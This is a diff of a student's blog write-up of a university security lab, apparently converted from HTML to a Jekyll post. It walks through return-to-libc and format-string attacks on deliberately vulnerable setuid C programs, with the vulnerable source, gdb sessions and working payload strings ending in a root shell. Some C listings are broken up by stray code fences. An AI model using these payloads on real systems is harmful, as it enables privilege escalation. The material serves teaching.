@@ -1,5 +1,15 @@
-<h1 id="advanced-exploits-taunt-lab">Advanced Exploits Taunt Lab</h1>
+---
+layout: post
+title:  "Exploits Taunt Lab"
+date:   2017-04-21
+desc: "Computer Security Exploits Taunt Lab"
+keywords: "Security,School,tutorial,blog"
+categories: [School]
+tags: [Security,School]
+icon: icon-html
+---
 
+<h1 id="advanced-exploits-taunt-lab">Advanced Exploits Taunt Lab</h1>
 <ul>
 <li>Return-to-libc </li>
 <li>Format String attack</li>
@@ -9,13 +19,8 @@
 
 <p>This lab includes some advanced exploits skills. The non-executable bit for writable segments (NX) has now been enabled for some of your targets. You will no longer be able to jump to shellcode on the stack. </p>
 
-
-
 <h2 id="return-to-libc">Return-to-libc</h2>
-
 <p>The code below is a vulnerable program  <strong>durka.c</strong> with some system call we can use. _</p>
-
-
 
 <pre class="prettyprint"><code class="language-C hljs cpp">
 <span class="hljs-comment">/* Belongs to user*/</span>
@@ -51,14 +56,19 @@
         <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)
                 <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
 
-        uid_t uid = getuid();
-        uid_t euid = geteuid();
+```
+    uid_t uid = getuid();
+    uid_t euid = geteuid();
+```
 
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">"running as uid = %u, euid = %u\n"</span>, uid, euid);
 
-        f(argv[<span class="hljs-number">1</span>]);
+```
+    f(argv[<span class="hljs-number">1</span>]);
 
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
+
 }
 </code></pre>
 
@@ -93,7 +103,6 @@ The technique is as introduced before.  <br>
 <code>call   8048400 &lt;system@plt&gt;: 0x80485b8</code></p>
 
 <p>You may wonder why we don’t want to use the address of the system call <code>system@plt</code> itself. The reason is that <code>bash</code> will ignore any <code>null</code> bytes as argument, so the <code>00</code> byte in address <code>0x08048400</code> will be ignored, and that is a real pain in the ass.</p>
-
 <p>So chain up the return addresses like this: <br>
 <code>$(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08"')</code> <br>
 And let’s try run this input inside <code>gdb</code> and examine the stack at each function.  <br>
@@ -109,8 +118,6 @@ Don’t forget to clear out the <code>LINES</code> and <code>COLUMNS</code> envi
 
 <p>Set up several break points so we can examine the stack.</p>
 
-
-
 <pre class="prettyprint"><code class="language-gdb hljs livecodeserver"> (gdb) b f
 Breakpoint <span class="hljs-number">1</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x8048570</span>: <span class="hljs-built_in">file</span> durka.c, <span class="hljs-built_in">line</span> <span class="hljs-number">11.</span>
 (gdb) b agonistic_heaven
@@ -119,8 +126,6 @@ Breakpoint <span class="hljs-number">2</span> <span class="hljs-keyword">at</spa
 Breakpoint <span class="hljs-number">3</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x80485b0</span>: <span class="hljs-built_in">file</span> durka.c, <span class="hljs-built_in">line</span> <span class="hljs-number">24.</span></code></pre>
 
 <p>run the program with the designed input:</p>
-
-
 
 <pre class="prettyprint"><code class="language-gdb hljs tex">run <span class="hljs-formula">$(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08"')
 Starting program: /c0re/durka $</span>(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08"')
@@ -133,8 +138,6 @@ Continuing.
 Breakpoint 2, agonistic_heaven () at durka.c:17</code></pre>
 
 <p>Emm, indeed we step in to <code>agnostic_heaven()</code> not bad. Let’s examine what the stack look like after the function finished.</p>
-
-
 
 <pre class="prettyprint"><code class=" hljs perl">(gdb) disas
 Dump of assembler code <span class="hljs-keyword">for</span> function agonistic_heaven:
@@ -163,8 +166,6 @@ End of assembler <span class="hljs-keyword">dump</span>.
 </code></pre>
 
 <p><code>0x080485b8</code> is the address where we will call <code>system@plt</code>, but with what parameter? Recall that the parameter is always pushed to the top of stack, which right now is the next four bytes after the call address <code>0x08048600</code>, it should be some random stuff, but let’s just check.</p>
-
-
 
 <pre class="prettyprint"><code class=" hljs bash">(gdb) x/s <span class="hljs-number">0</span>x08048600
 <span class="hljs-number">0</span>x8048600 &lt;__libc_csu_init+<span class="hljs-number">48</span>&gt;: <span class="hljs-string">"1\377\215\266"</span></code></pre>
@@ -266,16 +267,12 @@ Non<span class="hljs-attribute">-debugging</span> symbols:
 
 <p>This is how you figure out the address of the whole environment table. Step through it ad figure out where is the <code>EVIL</code> variable stored.</p>
 
-
-
 <pre class="prettyprint"><code class=" hljs bash">(gdb)
 <span class="hljs-number">0</span>xffffddbc:     <span class="hljs-string">"EVIL=/bin/sh"</span>
 (gdb) x/s <span class="hljs-number">0</span>xffffddc1
 <span class="hljs-number">0</span>xffffddc1:     <span class="hljs-string">"/bin/sh"</span></code></pre>
 
 <p>Perfect! Now we have an address for <code>/bin/sh</code>. Next let’s add this to the exploit string. And try it out inside <code>gdb</code> first</p>
-
-
 
 <pre class="prettyprint"><code class=" hljs tex">(gdb) run <span class="hljs-formula">$(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xc</span>6<span class="hljs-command">\xdd</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span>"')
 Starting program: /c0re/attacklib1 $</span>(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xc</span>6<span class="hljs-command">\xdd</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span>"')
@@ -294,32 +291,20 @@ running as uid = 1030, euid = 0
 
 <p>Yayyyyy! We exploited a program without inject shellcode!</p>
 
-
-
 <h2 id="format-string-attack">Format String Attack</h2>
-
 <p>What is a format string? Because I never paid attention to the lecture (well I actually skipped a lot), this concept was really hard for me to understand. I’ll try to summarize the concept as best as I can, but if you still find it not very clear, you can check out <a href="https://www.youtube.com/watch?v=esxEaHrMgI8&amp;list=PLMGUdaTHpFQLmSAk5_cTM8Y502hhVpeNf&amp;index=14&amp;t=2388s">Ymir’s Youtube video</a> or <a href="https://www.exploit-db.com/docs/28476.pdf">this websit</a>.</p>
-
 <p>Recall when you write C, the first line of code you wrote, it is possibly something like this. <br>
 <code>printf("%s\n","Hello World!")</code> <br>
 The symbol <code>%s</code> here is the usage of a format string. It tells the system to interpret the variable <code>"Hello World"</code> you feed to the <code>printf()</code> function as a string. Actually there are more formats like this, here is a table of several common formats . </p>
 
 <p></p><table><tbody><tr><th>Format String </th><th>Output</th><th>Usage</th></tr><tr><td>%d</td><td>Decimal</td><td>Output decimal number</td></tr><tr><td>%s</td><td>String</td><td>Read string from memory</td></tr><tr><td>%x</td><td>Hexadecimal</td><td>Output hexadecimal number</td></tr><tr><td>%n</td><td>Number of bytes written so far</td><td>Write the number of bytes written so far</td></tr></tbody></table><p></p>
-
 <p>How is usage of format string vulnerable? Say you have something like:</p>
-
 <p><code>printf("You wrote: %08x.%08x.%08x.%08x.")</code></p>
-
 <p><code>printf</code> is trying to interpret your input as a 8-byte integer, but you didn’t give him any input. What happens now? It turns out that <code>printf</code> will just grab anything on top of the memory stack and interpret it as a 8-byte integer, so the above line of code will naively print out something like :</p>
-
 <p><code>You wrote:bfd7469f.000000f0.00000006.78383025</code> </p>
-
 <p>This groups of 8-byte integer are actually data stored on the memory stack, most likely several bytes after the <code>$esp</code> pointer. You actually already exploit the program as you can get valuable information of the stack, but we want more, we want to write to the stack. The option <code>%n</code>makes this available. </p>
-
 <p>Again, if you have something like this:</p>
-
 <p><code>printf("You wrote:%08x.%08x.%08x.%n")</code></p>
-
 <p>Note we changed the last %08x of the last code to %n. What will happen now is that it will still printout 3 8-byte data stored on the stack address, but the next 8-byte will be interpreted as address and <code>%n</code> will write the number of bytes written so far into that address. So, you will write : 10 byte (“You wrote:”) + 3 * 5 bytes (%08x.)  = 25 to the address started at <code>0x78383025</code>.  Wow, you can now write some arbitrary code into the address. Not bad right?  <br>
 Below is a vulnerable program using unsafe <code>sprintf</code> to copy buf. See if we can exploit it.</p>
 
@@ -332,6 +317,7 @@ Below is a vulnerable program using unsafe <code>sprintf</code> to copy buf. See
 <span class="hljs-preprocessor">#include &lt;unistd.h&gt;</span>
 
 
+
 <span class="hljs-comment">/* Oooh, this looks juicy ... */</span>
 <span class="hljs-keyword">void</span> heaven(<span class="hljs-keyword">void</span>)
 {
@@ -339,7 +325,6 @@ Below is a vulnerable program using unsafe <code>sprintf</code> to copy buf. See
         setreuid (uid, uid);
         system (<span class="hljs-string">"/bin/bash"</span>);
 }
-
 
 <span class="hljs-keyword">int</span> hall_e(<span class="hljs-keyword">char</span> *fmt)
 {
@@ -366,13 +351,15 @@ Below is a vulnerable program using unsafe <code>sprintf</code> to copy buf. See
                 syslog (LOG_INFO, <span class="hljs-string">"FORMAT:rwang74:%d/%d:%d\n"</span>, getuid(), geteuid(), <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]));
         closelog ();
 
-        hall_e (argv[<span class="hljs-number">1</span>]);
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
+    hall_e (argv[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
+
 }
 </code></pre>
 
 <p>To reduce the difficulty, this program already embedded another method called <code>heaven()</code> that does a series of system call to spawn a shell and gives us root privilege, our job is to just call it, which can be achieved by simply put the address of <code>heaven()</code> at the next 4-bytes after <code>$ebp</code>. So first two tasks: figure out <code>heaven()</code> address and <code>$ebp</code> when the <code>hall_e()</code> function returns. We can easily do this in <code>gdb</code>. (I believe this is really simple for you by now, so I will skip the detail).</p>
-
 <p><code>heaven address: 0x08048690 <br>
  ebp: 0xffffda30 <br>
 </code> <br>
@@ -429,17 +416,12 @@ Breakpoint <span class="hljs-number">2</span>, <span class="hljs-number">0x08048
 </code></pre>
 
 <p>You see what I was talking about now? May be it’s still not intuitive, let’s examine what are those stuff on stack.</p>
-
 <pre class="prettyprint"><code class="language-gdb hljs perl">(gdb) <span class="hljs-keyword">x</span>/<span class="hljs-keyword">s</span> <span class="hljs-number">0xffffd95e</span>
 <span class="hljs-number">0xffffd95e</span>:     <span class="hljs-string">"You said:    4\332\377\377<span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%%</span>n\n"</span></code></pre>
 
 <p>Note the <code>0x20</code> is the ASCII code for space. Look at the place where our desired address appears. </p>
-
 <p><code>0xffda3420      0x257825ff</code></p>
-
 <p>It is broken by that one extra <code>0x20</code>, and there is no way we can interpret from a odd address, and since we can not delete that extra <code>0x20</code>, our only chance is to append our input with some junks to push the desired address back. </p>
-
-
 
 <pre class="prettyprint"><code class="language-gdb hljs applescript">(gdb) <span class="hljs-command">run</span> $(python -c 'print <span class="hljs-string">"AAA\x34\xda\xff\xff"</span>+<span class="hljs-string">"%x"</span>*<span class="hljs-number">9</span>+<span class="hljs-string">"%x"</span>+<span class="hljs-string">"%n"</span>')
 The program being debugged has been started already.
@@ -477,11 +459,12 @@ and run it in gdb. </p>
 
 <p>after it put a huge width … We entered the shell. Let’s try it in real program.</p>
 
-
-
 <pre class="prettyprint"><code class=" hljs ruby">rwang74<span class="hljs-variable">@bb7bd829ff8f</span><span class="hljs-symbol">:/c0re</span><span class="hljs-variable">$ </span>/c0re/attackformat <span class="hljs-variable">$(</span>python -c <span class="hljs-string">'print "AAA\x34\xda\xff\xff"+"%x"*9+"%134514234x"+"%n"'</span>)
 
-                                           <span class="hljs-number">41414120</span>
+```
+                                       <span class="hljs-number">41414120</span>
+```
+
 root<span class="hljs-variable">@bb7bd829ff8f</span><span class="hljs-symbol">:/c0re</span><span class="hljs-comment"># whoami</span>
 root</code></pre>
 
